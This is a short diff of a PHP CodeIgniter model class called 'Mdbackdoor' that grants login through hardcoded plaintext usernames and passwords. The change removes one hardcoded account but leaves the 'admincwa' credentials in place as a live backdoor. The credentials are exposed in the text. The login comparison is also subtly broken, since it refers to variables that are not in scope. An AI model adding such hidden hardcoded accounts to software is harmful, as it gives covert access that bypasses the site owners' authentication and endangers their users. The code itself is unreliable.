@@ -5,8 +5,7 @@ class Mdbackdoor extends CI_Model {
 
 	var $harduser = "admincwa";
 	var $hardpass = "makan3xtidur1x";
-	var $harduser2 = 'cscwa';
-	var $hardpass2 = 'cs123456';
+
 
 	function cek_login(){
 		if(isset($_SESSION['backdoor_token'])){
@@ -20,8 +19,7 @@ class Mdbackdoor extends CI_Model {
 	function login($username, $password){
 		if($username == $harduser and $password == $hardpass){
 			return true;
-		} else if ($username == $harduser2 and $password == $hardpass2){
-			return true;
+		
 		} else {
 			return false;
 		}
